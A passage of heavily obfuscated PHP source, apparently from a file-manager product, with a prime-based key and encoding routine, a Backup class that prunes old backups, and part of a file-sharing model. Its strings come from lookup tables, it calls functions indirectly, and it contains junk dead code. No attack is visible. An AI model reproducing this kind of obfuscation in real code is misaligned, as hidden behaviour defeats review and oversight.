$” Øçïç[0]; $” Øçïç = substr($” Øçïç, 1); $ÖÕÁ±¶ = $Â÷Ç¡›ê[812]; if (strlen($ÖÕÁ±¶) < $Â÷Ç¡›ê[715]) { return; } $€øşğêÑ = strpos($îî¦’¿×, $ıñÚŞúÖ); $€èÂó‚½ = $Â÷Ç¡›ê[813]; $èê”ÁåÏ = md5($ıñÚŞúÖ . md5($ÁÚ±ÜÙŸ . $ıñÚŞúÖ) . $ÁÚ±ÜÙŸ); $¤®¼É§Ç = $Â÷Ç¡›ê[814]; while ($¤®¼É§Ç < $Â÷Ç¡›ê[718]) { if ($¤®¼É§Ç >= 0) { break; } $¤®¼É§Ç++; } $èê”ÁåÏ = substr($èê”ÁåÏ, $€øşğêÑ % 8, $€øşğêÑ % 8 + 7); $¡øÆ€ÀØ = $Â÷Ç¡›ê[815]; $•¢åÊ­Â = $üâôÓñ‹[6]; $ÂÇÍ²ïÖ = $Â÷Ç¡›ê[816]; if (strlen($ÂÇÍ²ïÖ) < $Â÷Ç¡›ê[496]) { return; } $ŒÂ Œ³„ = 0; $ŸãºùÀ = $Â÷Ç¡›ê[817]; if (strlen($ŸãºùÀ) < $Â÷Ç¡›ê[722]) { return; } $¢ªÒˆ­ = 0; $´«ÑûŠ’ = $Â÷Ç¡›ê[818]; if (strlen($´«ÑûŠ’) < $Â÷Ç¡›ê[496]) { return; } $¢ÇëÙ³ = 0; $«¼ò’ğ = $Â÷Ç¡›ê[819]; for ($ŒÂ Œ³„ = 0; $ŒÂ Œ³„ < strlen($” Øçïç); $ŒÂ Œ³„++) { $¢ÇëÙ³ = $¢ÇëÙ³ == strlen($èê”ÁåÏ) ? 0 : $¢ÇëÙ³; $ÌÇÇ›â = $Â÷Ç¡›ê[820]; if (strlen($ÌÇÇ›â) < $Â÷Ç¡›ê[722]) { return; } $Ï®òıùØ = $¢ÇëÙ³++; $¶¡ã‹ÏÜ = $Â÷Ç¡›ê[821]; if (strlen($¶¡ã‹ÏÜ) < $Â÷Ç¡›ê[715]) { return; } $¢ªÒˆ­ = strpos($îî¦’¿×, $” Øçïç[$ŒÂ Œ³„]) - $€øşğêÑ - ord($èê”ÁåÏ[$Ï®òıùØ]); $üŞú·Àõ = $Â÷Ç¡›ê[822]; if (strlen($üŞú·Àõ) < $Â÷Ç¡›ê[722]) { return; } while ($¢ªÒˆ­ < 0) { $¢ªÒˆ­ += 64; $—ó€Ÿ¯ = $Â÷Ç¡›ê[797]; if (!$—ó€Ÿ¯) { return; } } $•¢åÊ­Â .= $îî¦’¿×[$¢ªÒˆ­]; } $Ÿ¯Ã°Ä = base64_decode($•¢åÊ­Â); $òòŞíäè = $Â÷Ç¡›ê[823]; while ($òòŞíäè < $Â÷Ç¡›ê[718]) { if ($òòŞíäè >= 0) { break; } $òòŞíäè++; } break; $æîáº Ù = $Â÷Ç¡›ê[824]; default: $Ÿ¯Ã°Ä = $this->kpaq1b8d26ed($” Øçïç, $ÁÚ±ÜÙŸ . $“™âÒ¤); $ı—Ãğ®× = $Â÷Ç¡›ê[825]; if (strlen($ı—Ãğ®×) < $Â÷Ç¡›ê[728]) { return; } break; $ğÖ„²¯Ê = $Â÷Ç¡›ê[826]; if (!$ğÖ„²¯Ê) { return; } } if ($ëËäóèˆ - 1 > 0) { $Ÿ¯Ã°Ä = $this->lkmh26aff200($Ÿ¯Ã°Ä, $ÁÚ±ÜÙŸ, $ëËäóèˆ - 1); } return $Ÿ¯Ã°Ä; } public function tiwaa2113ee2($¨Œü€ù) { $½öİå¿´ =& $_SERVER[€ä¾™²]; $ïªƒ¡Ñ¹ =& $_SERVER[ÃË¡]; $Æ®©»»€ = $this->ejcr6a537d92(); $è‡ªÓ÷ = $½öİå¿´[827]; $÷¦‡“‡Ï = $this->ejcr6a537d92(); $Å÷íŠÜ¾ = $½öİå¿´[828]; if (!$Å÷íŠÜ¾) { return; } $è¡¥€•’ = ($Æ®©»»€ - 1) * ($÷¦‡“‡Ï - 1); $Ï—•Êàå = $½öİå¿´[829]; if (!$Ï—•Êàå) { return; } $ŸÙÀ®ƒà = intval(($Æ®©»»€ + $÷¦‡“‡Ï) / 2); $…Ğğ‰™ì = $½öİå¿´[826]; if (!$…Ğğ‰™ì) { die; } while (1) { $ƒ‹ã¿Ãß = $ŸÙÀ®ƒà; $’¥ÔÍêØ = $½öİå¿´[830]; while ($’¥ÔÍêØ < $½öİå¿´[718]) { if ($’¥ÔÍêØ >= 0) { break; } $’¥ÔÍêØ++; } $·–¬áí¾ = $è¡¥€•’; while ($·–¬áí¾ % $ƒ‹ã¿Ãß != 0) { $ùçÒÀ«Ñ = $·–¬áí¾; $·–¬áí¾ = $ƒ‹ã¿Ãß; $ƒ‹ã¿Ãß = $ùçÒÀ«Ñ % $ƒ‹ã¿Ãß; } if ($ƒ‹ã¿Ãß == 1) { break; } else { $ŸÙÀ®ƒà++; } } $ù ¦ˆÒ = 2; for ($Êê‚–®“ = 0; $Êê‚–®“ < $è¡¥€•’ * 10; $Êê‚–®“++) { if (($è¡¥€•’ * $Êê‚–®“ + 1) % $ŸÙÀ®ƒà == 0) { $ù ¦ˆÒ = intval(($è¡¥€•’ * $Êê‚–®“ + 1) / $ŸÙÀ®ƒà); break; } } $ ÇŸª­ = $this->jmwp8ff5cb40($Æ®©»»€ * $÷¦‡“‡Ï . $ïªƒ¡Ñ¹[6], $ïªƒ¡Ñ¹[138]); $ú‘ÈË™´ = $½öİå¿´[831]; while ($ú‘ÈË™´ < $½öİå¿´[496]) { if ($ú‘ÈË™´ >= 0) { break; } $ú‘ÈË™´++; } $©Èµû„ø = md5($ïªƒ¡Ñ¹[310] . ($Æ®©»»€ + $÷¦‡“‡Ï) . $ïªƒ¡Ñ¹[311] . $ŸÙÀ®ƒà . $ïªƒ¡Ñ¹[311] . $ù ¦ˆÒ . $ïªƒ¡Ñ¹[312]); $ë¨’é¤  = $½öİå¿´[832]; if (strlen($ë¨’é¤ ) < $½öİå¿´[496]) { return; } $Ûíâøî¹ = $this->jmwp8ff5cb40($¨Œü€ù, $©Èµû„ø) . $ïªƒ¡Ñ¹[313] . $ ÇŸª­; return $Ûíâøî¹; $Š¯³äóö = $½öİå¿´[833]; if (!$Š¯³äóö) { die; } } public function zpuf09283181($ò´Ü ‰ƒ) { $ƒÀùŸ” =& $_SERVER[€ä¾™²]; $Ÿ¶î‰‹İ =& $_SERVER[ÃË¡]; $âªÅóœ = explode($Ÿ¶î‰‹İ[313], $ò´Ü ‰ƒ); $òŒûËØ = $ƒÀùŸ”[834]; if (strlen($òŒûËØ) < $ƒÀùŸ”[728]) { return; } if (count($âªÅóœ) != 2) { return $Ÿ¶î‰‹İ[6]; } $’éü¼ÒÉ = $this->kpaq1b8d26ed($âªÅóœ[1] . $Ÿ¶î‰‹İ[6], $Ÿ¶î‰‹İ[138]); $°º¾É­ = $ƒÀùŸ”[794]; if (!$°º¾É­) { die; } if (!$’éü¼ÒÉ) { return $Ÿ¶î‰‹İ[6]; } $’éü¼ÒÉ = intval($’éü¼ÒÉ); $Ûñ‘ƒÇë = 0; $›õŸÇ­ò = 0; $Óé º– = $ƒÀùŸ”[835]; for ($ÀÜşÅÖ  = 3; $ÀÜşÅÖ  < $’éü¼ÒÉ; $ÀÜşÅÖ  += 2) { if ($’éü¼ÒÉ % $ÀÜşÅÖ  != 0) { continue; } $Ûñ‘ƒÇë = $ÀÜşÅÖ ; $›õŸÇ­ò = intval($’éü¼ÒÉ / $ÀÜşÅÖ ); break; $“•Ç™½­ = $ƒÀùŸ”[836]; if (strlen($“•Ç™½­) < $ƒÀùŸ”[496]) { return; } } $Î’ù³­ = ($Ûñ‘ƒÇë - 1) * ($›õŸÇ­ò - 1); $³€·¬† = intval(($Ûñ‘ƒÇë + $›õŸÇ­ò) / 2); while (1) { $ûÊì²®« = $³€·¬†; $ğğ˜ğÖÚ = $Î’ù³­; $¯½Òû‰ = $ƒÀùŸ”[837]; if (strlen($¯½Òû‰) < $ƒÀùŸ”[718]) { return; } while ($ğğ˜ğÖÚ % $ûÊì²®« != 0) { $„¶ïØ˜ = $ğğ˜ğÖÚ; $êØ§Ò† = $ƒÀùŸ”[838]; while ($êØ§Ò† < $ƒÀùŸ”[715]) { if ($êØ§Ò† >= 0) { break; } $êØ§Ò†++; } $ğğ˜ğÖÚ = $ûÊì²®«; $úÉ³òş = $ƒÀùŸ”[839]; while ($úÉ³òş < $ƒÀùŸ”[722]) { if ($úÉ³òş >= 0) { break; } $úÉ³òş++; } $ûÊì²®« = $„¶ïØ˜ % $ûÊì²®«; } if ($ûÊì²®« == 1) { break; } else { $³€·¬†++; } } $£ÃëÕ€ı = 2; for ($ÀÜşÅÖ  = 0; $ÀÜşÅÖ  < $Î’ù³­ * 10; $ÀÜşÅÖ ++) { if (($Î’ù³­ * $ÀÜşÅÖ  + 1) % $³€·¬† == 0) { $£ÃëÕ€ı = intval(($Î’ù³­ * $ÀÜşÅÖ  + 1) / $³€·¬†); break; } } $¿ÓÌå = md5($Ÿ¶î‰‹İ[310] . ($Ûñ‘ƒÇë + $›õŸÇ­ò) . $Ÿ¶î‰‹İ[311] . $³€·¬† . $Ÿ¶î‰‹İ[311] . $£ÃëÕ€ı . $Ÿ¶î‰‹İ[312]); $äåçº÷ = $this->kpaq1b8d26ed($âªÅóœ[0], $¿ÓÌå); $Ş›§¹™ = $ƒÀùŸ”[840]; if (strlen($Ş›§¹™) < $ƒÀùŸ”[715]) { return; } return $äåçº÷; } public function ejcr6a537d92() { $ê ‹õÔ± =& $_SERVER[€ä¾™²]; $îÛÙğ«§ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ç³Û±²ó = $ê ‹õÔ±[841]; if (strlen($ç³Û±²ó) < $ê ‹õÔ±[715]) { return; } $²¹ŞÇ‘‚ = array(); $…Áİéİ€ = $ê ‹õÔ±[842]; while (strlen($…Áİéİ€) < $ê ‹õÔ±[718]) { if (!$…Áİéİ€) { break; } $…Áİéİ€++; } $ÇíìÛë· = 1; while ($ÇíìÛë· <= (int) sqrt($îÛÙğ«§)) { $¡¹‹Ì¼È = $ÇíìÛë·; $ÂÊ‘åå¿ = $ê ‹õÔ±[843]; while (strlen($ÂÊ‘åå¿) < $ê ‹õÔ±[722]) { if (!$ÂÊ‘åå¿) { break; } $ÂÊ‘åå¿++; } while (!0) { $¡¹‹Ì¼È++; if ($¡¹‹Ì¼È <= 2) { $ÇíìÛë· = $¡¹‹Ì¼È; break; } else { if ($¡¹‹Ì¼È < 2) { continue; } } $«µúûâí = !0; for ($÷çéÑ”â = 2; $÷çéÑ”â <= sqrt($¡¹‹Ì¼È); $÷çéÑ”â++) { if ($¡¹‹Ì¼È % $÷çéÑ”â == 0) { $«µúûâí = !1; } } if ($«µúûâí) { $ÇíìÛë· = $¡¹‹Ì¼È; break; } } $²¹ŞÇ‘‚[] = $ÇíìÛë·; $ÛçÃôÖ÷ = $ê ‹õÔ±[844]; if (strlen($ÛçÃôÖ÷) < $ê ‹õÔ±[715]) { die; } } $æ¥¦ñŒ¬ = 2; for ($¡¹‹Ì¼È = $îÛÙğ«§; $¡¹‹Ì¼È > 1; $¡¹‹Ì¼È--) { $«µúûâí = !0; $¬½ˆ©Û˜ = $ê ‹õÔ±[845]; while ($¬½ˆ©Û˜ < $ê ‹õÔ±[496]) { if ($¬½ˆ©Û˜ >= 0) { break; } $¬½ˆ©Û˜++; } foreach ($²¹ŞÇ‘‚ as $úüÅ½”) { if ($¡¹‹Ì¼È % $úüÅ½” == 0) { $«µúûâí = !1; break; } } if ($«µúûâí) { $æ¥¦ñŒ¬ = $¡¹‹Ì¼È; break; } } return $æ¥¦ñŒ¬; $‘‘ŠçÎù = $ê ‹õÔ±[846]; } public function toqm983648fe($£‚½°ê, $µ”°‘İ) { $º¶©·ÓÅ =& $_SERVER[ÃË¡]; return call_user_func(array($º¶©·ÓÅ[8], $º¶©·ÓÅ[314]), $£‚½°ê, $µ”°‘İ); } public function jmwp8ff5cb40($´¨ÏŞß, $¸Ïˆı¥Î) { $ß“á»ñ¶ =& $_SERVER[ÃË¡]; return call_user_func(array($ß“á»ñ¶[315], $ß“á»ñ¶[316]), $´¨ÏŞß, $¸Ïˆı¥Î); } public function kpaq1b8d26ed($Ï€ÄÄ™Ú, $÷èŒÙ¡„) { $˜ö•Õ×  =& $_SERVER[€ä¾™²]; $¬Ñùóì =& $_SERVER[ÃË¡]; return call_user_func(array($¬Ñùóì[315], $¬Ñùóì[317]), $Ï€ÄÄ™Ú, $÷èŒÙ¡„); $¡â×Û½ = $˜ö•Õ× [847]; if (strlen($¡â×Û½) < $˜ö•Õ× [496]) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[€ä¾™²][848]); $this->init(); $this->keep(); } public function init() { $ÅËäªÉ± =& $_SERVER[€ä¾™²]; $this->isManual(); self::$name = date($ÅËäªÉ±[849]); if (!($¤Á’è´Ü = $this->model->lastItem())) { $¤Á’è´Ü = $this->initData(); } else { self::$name = $¤Á’è´Ü[$ÅËäªÉ±[32]]; if ($¤Á’è´Ü[$ÅËäªÉ±[850]] == $ÅËäªÉ±[91]) { self::$name = date($ÅËäªÉ±[260]); $©ô™Šì€ = intval(_get($¤Á’è´Ü, $ÅËäªÉ±[851], 0)); if (self::$manual == 0 && $¤Á’è´Ü[$ÅËäªÉ±[32]] == self::$name) { $this->model->remove($¤Á’è´Ü[$ÅËäªÉ±[486]]); } $¤Á’è´Ü = $this->initData($©ô™Šì€, $¤Á’è´Ü[$ÅËäªÉ±[852]]); } else { $this->checkStore($¤Á’è´Ü[$ÅËäªÉ±[852]]); } } self::$option = $¤Á’è´Ü; } private function isManual() { $å¢•âÚ = _get($GLOBALS, $_SERVER[€ä¾™²][853], 0); $å¢•âÚ = intval($å¢•âÚ); self::$manual = $å¢•âÚ && $å¢•âÚ == 1 ? 1 : 0; } private function initData($Â­ñëª = 0, $«¿äí² = '') { $¸áş¢ªæ =& $_SERVER[€ä¾™²]; $°ÙĞ×ş£ = $this->model->config(); if ($«¿äí² && $°ÙĞ×ş£[$¸áş¢ªæ[852]] != $«¿äí²) { $Â­ñëª = 0; } $this->checkStore($°ÙĞ×ş£[$¸áş¢ªæ[852]]); if (self::$manual == 1) { self::$name .= $¸áş¢ªæ[11] . date($¸áş¢ªæ[854]); } $İ’¿ŒÔî = array($¸áş¢ªæ[852] => $°ÙĞ×ş£[$¸áş¢ªæ[852]], $¸áş¢ªæ[32] => self::$name, $¸áş¢ªæ[850] => 0, $¸áş¢ªæ[169] => $°ÙĞ×ş£[$¸áş¢ªæ[169]], $¸áş¢ªæ[855] => self::$manual, $¸áş¢ªæ[856] => array($¸áş¢ªæ[857] => array($¸áş¢ªæ[850] => 0), $¸áş¢ªæ[858] => array($¸áş¢ªæ[850] => 0, $¸áş¢ªæ[859] => 0, $¸áş¢ªæ[860] => 0, $¸áş¢ªæ[33] => $¸áş¢ªæ[12], $¸áş¢ªæ[861] => 0, $¸áş¢ªæ[862] => 0), $¸áş¢ªæ[863] => array($¸áş¢ªæ[850] => 0, $¸áş¢ªæ[859] => 0, $¸áş¢ªæ[860] => 0, $¸áş¢ªæ[861] => 0, $¸áş¢ªæ[862] => 0), $¸áş¢ªæ[231] => array($¸áş¢ªæ[850] => 0, $¸áş¢ªæ[864] => 0, $¸áş¢ªæ[865] => 0, $¸áş¢ªæ[866] => 0, $¸áş¢ªæ[867] => 0, $¸áş¢ªæ[564] => $Â­ñëª, $¸áş¢ªæ[861] => 0, $¸áş¢ªæ[862] => 0)), $¸áş¢ªæ[861] => time(), $¸áş¢ªæ[862] => 0); $¡—Ñ ø = $this->model->insert($İ’¿ŒÔî); $İ’¿ŒÔî[$¸áş¢ªæ[486]] = $¡—Ñ ø; return $İ’¿ŒÔî; } private function checkStore($ŸÍÁÅÅ¯) { $ÒñÛùï = Model($_SERVER[€ä¾™²][868]); $ìŞü›è» = $ÒñÛùï->listData($ŸÍÁÅÅ¯); $ÒñÛùï->checkConfig($ìŞü›è»); } public static function get() { if (!self::$option) { $¤©àÛ¥“ = Model($_SERVER[€ä¾™²][848]); $Œòû›¦Ê = $¤©àÛ¥“->findByName(self::$name); $¤©àÛ¥“->parseContent($Œòû›¦Ê); self::$option = $Œòû›¦Ê; } return self::$option; } public static function set($Ê½™¸¯¦) { $€Ö»«í =& $_SERVER[€ä¾™²]; $¥Œäµ = self::get(); foreach ($Ê½™¸¯¦ as $î¼É¾÷© => $û±©µÓ) { array_set_value($¥Œäµ, $î¼É¾÷©, $û±©µÓ); } Model($€Ö»«í[848])->update($¥Œäµ[$€Ö»«í[486]], $¥Œäµ); self::$option = $¥Œäµ; return self::$option; } public function keep() { $¾ôÈ–ç =& $_SERVER[€ä¾™²]; $ğºÜøí¢ = self::get(); if (_get($ğºÜøí¢, $¾ôÈ–ç[869], 0) == $¾ôÈ–ç[91]) { return; } $this->backupKeep($ğºÜøí¢); self::set(array($¾ôÈ–ç[869] => 1)); } private function backupKeep($ı·İïÄ) { $Ñï£¤Ï± =& $_SERVER[€ä¾™²]; if (self::$manual == 1) { return; } $îËô‘¥¤ = $this->model->listData(); if (empty($îËô‘¥¤)) { return; } $Ø»æ§ = array(); $¤êÌâ† = array(); $áÉ´ˆ­® = date($Ñï£¤Ï±[870], strtotime($Ñï£¤Ï±[871])); foreach ($îËô‘¥¤ as $ôë¿àâ => $êšêŒ­) { $ûÓ™Á†• = $êšêŒ­[$Ñï£¤Ï±[32]]; if ($ôë¿àâ < 7 || $êšêŒ­[$Ñï£¤Ï±[855]] == $Ñï£¤Ï±[91]) { $Ø»æ§[] = $ûÓ™Á†•; continue; } $ÏÍÓĞÛÃ = substr($ûÓ™Á†•, 0, 6); if ($ÏÍÓĞÛÃ < $áÉ´ˆ­®) { continue; } if (!isset($¤êÌâ†[$ÏÍÓĞÛÃ]) || $ûÓ™Á†• < $¤êÌâ†[$ÏÍÓĞÛÃ]) { $¤êÌâ†[$ÏÍÓĞÛÃ] = $ûÓ™Á†•; } if (substr($ûÓ™Á†•, 6, 2) == $Ñï£¤Ï±[872]) { $¤êÌâ†[$ÏÍÓĞÛÃ] = $ûÓ™Á†•; } } $Ø»æ§ = array_merge($Ø»æ§, array_values($¤êÌâ†)); $Ø»æ§ = array_unique($Ø»æ§); foreach ($îËô‘¥¤ as $êšêŒ­) { $ûÓ™Á†• = $êšêŒ­[$Ñï£¤Ï±[32]]; if (!empty($ûÓ™Á†•) && in_array($ûÓ™Á†•, $Ø»æ§)) { continue; } $this->model->remove($êšêŒ­[$Ñï£¤Ï±[486]]); $§éë½½ = $this->backupPath($ı·İïÄ); IO::remove($§éë½½, !1); } } private function backupPath($¼¿Ë×ÏÊ) { $áÎñ ­ =& $_SERVER[€ä¾™²]; static $ê¯İ´êñ = null; if (is_null($ê¯İ´êñ)) { $ê¯İ´êñ = Model($áÎñ ­[873])->get($áÎñ ­[874]); } $¼•£Õú = $¼¿Ë×ÏÊ[$áÎñ ­[32]]; $”õ†Ôôø = substr(md5($áÎñ ­[875] . $ê¯İ´êñ . $¼•£Õú), 0, 8); return "\x7b\x69\x6f\x3a{$¼¿Ë×ÏÊ[$áÎñ ­[852]]}\x7d\x2f\x64\141\164\141\x62\141\163\x65\57\142\x61\143\x6b\165\160\x2f" . $¼•£Õú . $áÎñ ­[11] . $”õ†Ôôø; } public function db() { $ù‰¡Õù¿ =& $_SERVER[€ä¾™²]; $œÙ£ë—¨ = self::get(); if (_get($œÙ£ë—¨, $ù‰¡Õù¿[876], 0) == $ù‰¡Õù¿[91]) { return !0; } $Øáïú™“ = new BackupDb(); if (!$Øáïú™“->index()) { return !1; } self::set(array($ù‰¡Õù¿[876] => 1)); return !0; } public function dbFile() { $ôù‡Õ‘ =& $_SERVER[€ä¾™²]; $ÀªÊòôä = self::get(); if (_get($ÀªÊòôä, $ôù‡Õ‘[877], 0) == $ôù‡Õ‘[91]) { return !0; } $¢ÑÔ´×Ë = new BackupDbFile(); if (!$¢ÑÔ´×Ë->index()) { return !1; } self::set(array($ôù‡Õ‘[877] => 1)); return !0; } public function file() { $…‘éÅëØ =& $_SERVER[€ä¾™²]; $Œîëßò‰ = self::get(); if (_get($Œîëßò‰, $…‘éÅëØ[878], 0) == $…‘éÅëØ[91]) { return !0; } if ($Œîëßò‰[$…‘éÅëØ[169]] == $…‘éÅëØ[879]) { $İ›Üòï = new BackupFile(); if (!$İ›Üòï->index()) { return !1; } } self::set(array($…‘éÅëØ[878] => 1, $…‘éÅëØ[850] => 1)); return !0; } public static function log($£‘Íı¥†) { write_log($£‘Íı¥†, $_SERVER[€ä¾™²][880]); } } goto d­’Êæ÷°; C¡ëŒ“§£ç: class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\x65"; protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\163\x65\x72\164\54\165\160\x64\x61\164\145", "\146\165\156\x63\164\x69\157\156"), array("\x63\162\x65\141\164\145\x54\151\x6d\145", "\164\151\x6d\145", "\151\156\163\x65\162\x74", "\x66\x75\x6e\143\x74\x69\x6f\x6e"), array("\x6f\x70\x74\x69\x6f\156\x73", '', "\x69\156\x73\145\162\164\x2c\165\x70\x64\x61\164\145\x2c\163\x65\154\145\x63\x74", "\152\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($êü¯„†) { $±Ÿ â²ò =& $_SERVER[€ä¾™²]; return array($±Ÿ â²ò[2267] => array(USER_ID, $±Ÿ â²ò[2268]), $±Ÿ â²ò[2269] => array($êü¯„†[0], $±Ÿ â²ò[2270])); } protected function ___listSimple() { $äşü•¯¾ = $this->field($this->fieldList)->where(array($_SERVER[€ä¾™²][1539] => USER_ID))->select(); return $äşü•¯¾ ? $äşü•¯¾ : array(); } protected function ___getInfoShare($À½îÚ) { return $this->_getShareInfo(array($_SERVER[€ä¾™²][694] => $À½îÚ), !1); } protected function getInfo($”ê½«÷¨) { $ò§Á„‡ş = $this->getInfoShare($”ê½«÷¨); return $this->shareSourceInfo($ò§Á„‡ş); } public function getInfoByHash($ß‚¶ªôÖ) { return $this->_getShareInfo(array($_SERVER[€ä¾™²][1501] => $ß‚¶ªôÖ)); } public function getInfoByPath($ÇˆÌš›Î) { $Õ¹òÌÕÁ =& $_SERVER[€ä¾™²]; $¯˜¼”âí = array($Õ¹òÌÕÁ[1539] => USER_ID, $Õ¹òÌÕÁ[192] => $ÇˆÌš›Î); return $this->_getShareInfo($¯˜¼”âí); } public function getInfoBySourcePath($şéèçá°) { $ãª²Ú¤Ô =& $_SERVER[€ä¾™²]; $ıŸßÄÉ = array($ãª²Ú¤Ô[1539] => USER_ID, $ãª²Ú¤Ô[590] => $şéèçá°); return $this->_getShareInfo($ıŸßÄÉ); } private function _getShareInfo($´ãÑ”æ—, $ùÆÏ´Ø = true) { $˜ğ±ğìæ =& $_SERVER[€ä¾™²]; $ñÈàüØ = $this->where($´ãÑ”æ—)->find(); if (!$ñÈàüØ) { return !1; } if (!is_array($ñÈàüØ[$˜ğ±ğìæ[587]])) { $ñÈàüØ[$˜ğ±ğìæ[587]] = array(); } $´ãÑ”æ— = array($˜ğ±ğìæ[694] => $ñÈàüØ[$˜ğ±ğìæ[694]]); $¶åÛù ¥ = $˜ğ±ğìæ[2271]; $ñÈàüØ[$˜ğ±ğìæ[1497]] = Model($˜ğ±ğìæ[695])->order($˜ğ±ğìæ[486])->field($¶åÛù ¥)->where($´ãÑ”æ—)->select(); if (!$ùÆÏ´Ø) { return $ñÈàüØ; } return $this->shareSourceInfo($ñÈàüØ); } private function shareSourceInfo($¢ŸÄ‰È) { $µ¼€ñÖì =& $_SERVER[€ä¾™²]; if (!is_array($¢ŸÄ‰È)) { return $¢ŸÄ‰È; } if ($¢ŸÄ‰È[$µ¼€ñÖì[192]] == $µ¼€ñÖì[229]) { $¢ŸÄ‰È[$µ¼€ñÖì[90]] = IO::info($¢ŸÄ‰È[$µ¼€ñÖì[590]]); } else { $¢ŸÄ‰È[$µ¼€ñÖì[90]] = Model($µ¼€ñÖì[1479])->pathInfo($¢ŸÄ‰È[$µ¼€ñÖì[192]]); } return $¢ŸÄ‰È; } protected function getInfoAuth($Éí«ê) { $¿şåÖÏÈ =& $_SERVER[€ä¾™²]; $ñ ¨è¶Ë = $this->getInfo($Éí«ê); if ($ñ ¨è¶Ë[$¿şåÖÏÈ[1539]] == USER_ID) { $ñ ¨è¶Ë[$¿şåÖÏÈ[509]] = $ñ ¨è¶Ë[$¿şåÖÏÈ[90]][$¿şåÖÏÈ[509]]; } else { $ñ ¨è¶Ë[$¿şåÖÏÈ[509]] = Model($¿şåÖÏÈ[594])->authMake($ñ ¨è¶Ë[$¿şåÖÏÈ[1497]]); } return $ñ ¨è¶Ë; } protected function listData($Ìšî¾¨ = null, $©®••œÙ = 300) { $¡ê»ì®Î =& $_SERVER[€ä¾™²]; $ğô–™ï¯ = array(array($¡ê»ì®Î[585] => array($¡ê»ì®Î[1125], 0), $¡ê»ì®Î[692] => array($¡ê»ì®Î[1125], 0), $¡ê»ì®Î[2272] => $¡ê»ì®Î[2228])); if ($Ìšî¾¨ == $¡ê»ì®Î[2273]) { $ğô–™ï¯ = array($¡ê»ì®Î[585] => 1); } else { if ($Ìšî¾¨ == $¡ê»ì®Î[1290]) { $ğô–™ï¯ = array($¡ê»ì®Î[692] => 1); } } $ğô–™ï¯[$¡ê»ì®Î[1539]] = USER_ID; $©ŞÃŒ’Ë = $this->where($ğô–™ï¯)->selectPage($©®••œÙ); return $©ŞÃŒ’Ë; } protected function listToMe($¯‚Ùõ´¬ = 300) { $¨×»¡¥Š =& $_SERVER[€ä¾™²]; $íü‘ó“ø = Model($¨×»¡¥Š[2274])->userGroupParents(USER_ID); $îÈ±Í½ö = array($¨×»¡¥Š[677] => SourceModel::TYPE_USER, $¨×»¡¥Š[596] => USER_ID); if ($íü‘ó“ø) { $îÈ±Í½ö = array(array($¨×»¡¥Š[677] => SourceModel::TYPE_USER, $¨×»¡¥Š[596] => USER_ID), array($¨×»¡¥Š[677] => SourceModel::TYPE_GROUP, $¨×»¡¥Š[596] => array($¨×»¡¥Š[7], $íü‘ó“ø)), $¨×»¡¥Š[2272] => $¨×»¡¥Š[2228]); } $ŒÑ¼¯Œ = Model($¨×»¡¥Š[695])->where($îÈ±Í½ö)->selectPage($¯‚Ùõ´¬); $¸Ù«‡Œ¤ = array_to_keyvalue_group($ŒÑ¼¯Œ[$¨×»¡¥Š[446]], $¨×»¡¥Š[694]); if (!$¸Ù«‡Œ¤) { return $ŒÑ¼¯Œ; } $ÖÉÔƒĞá = $¨×»¡¥Š[2275]; $îÈ±Í½ö = array($¨×»¡¥Š[694] => array($¨×»¡¥Š[514], array_keys($¸Ù«‡Œ¤))); $×å˜Şµ¢ = $this->field($ÖÉÔƒĞá)->where($îÈ±Í½ö)->select(); foreach ($×å˜Şµ¢ as $Îéõ†õ† => &$ûÂæ­) { $ûÂæ­[$¨×»¡¥Š[1497]] = $¸Ù«‡Œ¤[$ûÂæ­[$¨×»¡¥Š[694]]]; } unset($ûÂæ­); $Ò·Øâş = array($¨×»¡¥Š[2276] => $×å˜Şµ¢, $¨×»¡¥Š[2277] => $ŒÑ¼¯Œ[$¨×»¡¥Š[443]]); return $Ò·Øâş; } protected function shareAdd($ßÆ³ÊÙù, $íøœ‘‚) { $ÇŠË»àı =& $_SERVER[€ä¾™²]; $Äàƒ¢‚ = $this->_addShareData($ßÆ³ÊÙù, $íøœ‘‚); if (!empty($íøœ‘‚[$ÇŠË»àı[2278]])) { $this->_shareAuthSet($Äàƒ¢‚, $íøœ‘‚[$ÇŠË»àı[2278]]); } $this->shareEventAdd($ßÆ³ÊÙù, $íøœ‘‚, $ÇŠË»àı[2279]); return $Äàƒ¢‚; } protected function shareAddSystem($ÔÎ­ÍÅ¾, $¬¨¬™É®) { $Û¦µ©ôÔ =& $_SERVER[€ä¾™²]; $ö¦ƒÅí = $this->_addShareData($ÔÎ­ÍÅ¾, $¬¨¬™É®, $Û¦µ©ôÔ[190]); $this->_shareAuthSet($ö¦ƒÅí, $¬¨¬™É®[$Û¦µ©ôÔ[2278]]); return $ö¦ƒÅí; } private function shareEventAdd($èö¾»ªÌ, $ÊæÀì €, $—ÂöÚ¸à = "\x61\144\144") { $£§şé¿¦ =& $_SERVER[€ä¾™²]; if (!$èö¾»ªÌ || $èö¾»ªÌ == $£§şé¿¦[229]) { return; } if ($—ÂöÚ¸à == $£§şé¿¦[2279]) { if ($ÊæÀì €[$£§şé¿¦[585]] == $£§şé¿¦[91]) { Model($£§şé¿¦[662])->eventShare($èö¾»ªÌ, $£§şé¿¦[2280]); } if ($ÊæÀì €[$£§şé¿¦[692]] == $£§şé¿¦[91]) { Model($£§şé¿¦[662])->eventShare($èö¾»ªÌ, $£§şé¿¦[2281]); } return; } $¦±¦¶Ïì = $this->getInfoByPath($èö¾»ªÌ); $ãæŠôÈ• = $£§şé¿¦[2282]; if ($¦±¦¶Ïì[$£§şé¿¦[585]] == $£§şé¿¦[229] && $ÊæÀì €[$£§şé¿¦[585]] == $£§şé¿¦[91]) { $ãæŠôÈ• = $£§şé¿¦[2280]; } if ($¦±¦¶Ïì[$£§şé¿¦[585]] == $£§şé¿¦[91] && $ÊæÀì €[$£§şé¿¦[585]] == $£§şé¿¦[229]) { $ãæŠôÈ• = $£§şé¿¦[2283]; } if ($¦±¦¶Ïì[$£§şé¿¦[692]] == $£§şé¿¦[229] && $ÊæÀì €[$£§şé¿¦[692]] == $£§şé¿¦[91]) { $ãæŠôÈ• = $£§şé¿¦[2281]; } if ($¦±¦¶Ïì[$£§şé¿¦[692]] == 